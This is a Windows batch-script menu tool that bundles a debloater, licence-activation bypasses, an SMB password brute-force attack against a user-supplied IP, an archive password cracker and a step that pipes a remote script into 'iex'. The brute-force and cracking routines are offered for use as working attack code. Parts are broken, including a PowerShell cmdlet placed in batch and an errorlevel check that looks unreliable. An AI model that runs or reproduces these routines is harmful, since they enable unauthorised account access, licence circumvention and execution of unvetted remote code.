@echo off
:: Check if the script is running with elevated privileges butts
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process cmd -Argument '/c %~s0' -Verb RunAs"
    exit /b
)

@echo off
title Enhanced CMD Interface
color 7

:main_menu
cls
echo ===============================================================================
echo                              Main Menu - CMD Interface
echo ===============================================================================
echo 1: Debloat Windows 11/10       5: MAS Script
echo 2: KMS Activation              6: Chris Titus PowerShell Utilities
echo 3: SMB Bruteforce Attack       7: [31mExit[0m
echo 4: WinRAR Password Cracker
echo ===============================================================================
set /p choice="[Enter your choice]~: "

:: Validate input
if "%choice%"=="" echo Invalid input! Please select a number between 1 and 7.& pause & goto main_menu
if "%choice%" lss "1" echo Invalid input! Please select a number between 1 and 7.& pause & goto main_menu
if "%choice%" gtr "7" echo Invalid input! Please select a number between 1 and 7.& pause & goto main_menu

:: Navigate to the chosen option
if "%choice%"=="1" goto debloat
if "%choice%"=="2" goto kms
if "%choice%"=="3" goto smb_bruteforce
if "%choice%"=="4" goto winrar_cracker
if "%choice%"=="5" goto mas_script
if "%choice%"=="6" goto chris_titus
if "%choice%"=="7" goto exit

:: Error Handling for unknown input
echo [31mInvalid input, please try again.[0m
pause
goto main_menu

:debloat
cls
echo Running Windows 11/10 Debloat Script...
start "" "%~dp0%\Win11Debloat-master\Run.bat"
pause
goto main_menu

:kms
cls
echo Running KMS Activation Script...
start "" "%~dp0%\s1.bat"
pause
goto main_menu

:smb_bruteforce
cls
echo SMB Bruteforce Attack
color 0C
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Path to Password List: "

if not exist "%wordlist%" (
    echo ERROR: Password list not found!
    pause
    goto main_menu
)

set /a attempt_count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt_smb
)
echo Password not found :(
pause
goto main_menu

:attempt_smb
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %attempt_count%] Trying password: [%pass%]
set /a attempt_count=%attempt_count%+1
if %errorlevel% EQU 0 goto smb_success
goto :eof

:smb_success
echo Password found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto main_menu

:winrar_cracker
cls
echo WinRAR Password Cracker
color 0B
if not exist "C:\Program Files\7-Zip" (
    echo ERROR: 7-Zip not installed!
    pause
    color 7
    goto main_menu
)
set /p archive="Enter the path to the archive: "
if not exist "%archive%" (
    echo ERROR: Archive file not found!
    pause
    color 7
    goto main_menu
)

set /p wordlist="Enter path to password list: "
if not exist "%wordlist%" (
    echo ERROR: Password list not found!
    pause
    color 7
    goto main_menu
)

set /a attempt_count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt_winrar
)
echo Password not found :(
pause
color 7
goto main_menu

:attempt_winrar
"C:\Program Files\7-Zip\7z.exe" x -p%pass% "%archive%" -o"cracked" -y >nul 2>&1
echo [ATTEMPT %attempt_count%] Trying password: [%pass%]
set /a attempt_count=%attempt_count%+1
if %errorlevel% EQU 0 goto winrar_success
goto :eof

:winrar_success
echo Success! Password found: %pass%
pause
color 7
goto main_menu

:mas_script
cls
echo Running MAS Script...
powershell -Command "irm https://get.activated.win | iex"
pause
goto main_menu

:chris_titus
cls

Get-ExecutionPolicy unrestrict

echo Running Chris Titus PowerShell Utilities...
powershell -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\CMD\winutil.ps1"
:: Check for admin rights
openfiles >nul 2>&1
if '%errorlevel%'=='0' (
    powershell -NoProfile -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\CMD\winutil.ps1"
) else (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
)
pause
goto main_menu

:exit
cls
echo Exiting the script. Goodbye!
exit
